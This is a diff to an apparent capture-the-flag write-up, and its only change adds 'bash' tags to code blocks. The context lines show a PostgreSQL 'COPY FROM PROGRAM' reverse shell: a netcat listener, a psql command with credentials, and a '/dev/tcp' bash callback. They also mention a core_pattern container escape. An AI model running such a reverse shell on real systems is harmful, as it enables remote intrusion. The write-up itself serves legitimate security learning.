@@ -59,7 +59,7 @@ Armed with a user/pass for the `mydatabase` database, we can now authenticate to
 
 This is a great opportunity to use `COPY ... FROM PROGRAM` to set up a reverse shell and establish a stronger foothold on the machine hosting the PostgreSQL database. The tricky part is that we only have one command window to work with so I found a tool called tmux that lets you manage multiple terminal sessions inside a single terminal window. I put together a basic reverse shell that starts in another tmux window and connects to the PostgreSQL machine which is just _another_ container.
 
-```
+```bash
 apt-get update && apt install tmux -y
 tmux new -d -s netcat-listener 'nc -lvvp 4444'
 tmux new -d -s start-shell "psql postgresql://user:SecretPostgreSQLPassword@172.19.0.2:5432/mydatabase -c \\"CREATE TABLE rev_shell (data text); COPY rev_shell FROM program '/bin/bash -c \\\\\\"bash -i >& /dev/tcp/172.19.0.3/4444 0>&1\\\\\\"';\\""
@@ -102,7 +102,7 @@ Edit: Fail compilation
 
 In order to perform the _exact_ `core_pattern` escape detailed in Jordy’s blog, I needed to install the necessary dependencies to build and compile C programs. My initial google-ing told me that the `build-base` alpine package contained all of the dependencies needed. While true, the package took up what little remaining disk space I had on the container. It wasn’t until after solving the CTF that I went back and realized I do not need the entire suite of build-base tools and instead only need `gcc` and `musl-dev` to compile binaries in C.
 
-```
+```bash
 032c93ff87db:~/data$ df _-h
 Fi_lesystem                Size      Used Available Use% Mounted on
 overlay                 973.4M    700.1M    206.1M  77% /
